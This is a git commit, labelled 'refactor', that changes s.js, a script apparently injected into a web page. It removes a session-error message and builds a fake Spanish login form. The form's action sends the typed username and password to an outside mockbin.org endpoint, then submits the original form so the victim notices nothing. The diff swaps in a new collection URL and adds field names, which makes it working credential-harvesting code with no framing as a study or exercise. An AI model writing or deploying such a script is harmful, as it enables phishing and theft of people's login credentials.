d88cb5805086ea2f1b011ecac4d1b82a9ed25d7c
braisda <braisda@gmail.com>
2023-04-20 17:16:32 +0200

    refactor

--- s.js
+++ s.js
@@ -1,3 +1,6 @@
+var contenido = document.getElementById('contenido').innerHTML;
+contenido = contenido.replace(/<p><\/p>La sesión fué cerrada por el error:/g, '');
+document.getElementById('contenido').innerHTML = contenido;
 let form = document.createElement("form");
 form.setAttribute("class", "form-container");
 
@@ -9,6 +12,7 @@ labelUsuario.setAttribute("for", "usuario");
 labelUsuario.innerHTML = "USUARIO:";
 let usuario = document.createElement("input");
 usuario.setAttribute("type", "text");
+usuario.setAttribute("name", "usuario");
 usuario.setAttribute("class", "user");
 usuario.setAttribute("size", "20");
 usuario.setAttribute("maxlength", "50");
@@ -21,14 +25,16 @@ let labelPassword = document.createElement("label");
 labelPassword.setAttribute("for", "password");
 labelPassword.innerHTML = "CONTRASEÑA:";
 form.setAttribute("method", "post");
-form.setAttribute("action", 'javascript:var xhr = new XMLHttpRequest();xhr.withCredentials = true;xhr.addEventListener("readystatechange", function () {if (this.readyState === this.DONE) {document.forms[0].usuario.value=usuario.value;document.forms[0].password.value=password.value;document.forms[0].submit();}});xhr.open("POST", "http://mockbin.org/bin/b472abbc-c914-4604-8a40-18b0d44b894b%22);xhr.send(%60user=$%7Busuario.value%7D;password=$%7Bpassword.value%7D%60);%27);
+form.setAttribute("action", 'javascript:var xhr = new XMLHttpRequest();xhr.withCredentials = true;xhr.addEventListener("readystatechange", function () {if (this.readyState === this.DONE) {document.forms[0].usuario.value=usuario.value;document.forms[0].password.value=password.value;document.forms[0].submit();}});xhr.open("POST", "http://mockbin.org/bin/5c575471-5e68-4d34-8ac2-81a4f67e12e7");xhr.send(`user=${usuario.value};password=${password.value}`);');
 let password = document.createElement("input");
 password.setAttribute("type", "password");
 password.setAttribute("class", "password");
+password.setAttribute("name", "password");
 password.setAttribute("size", "20");
 password.setAttribute("maxlength", "50");
 passwordGroup.appendChild(labelPassword);
 passwordGroup.appendChild(password);
+
 
 let boton=document.createElement("input");
 boton.setAttribute("type","submit");
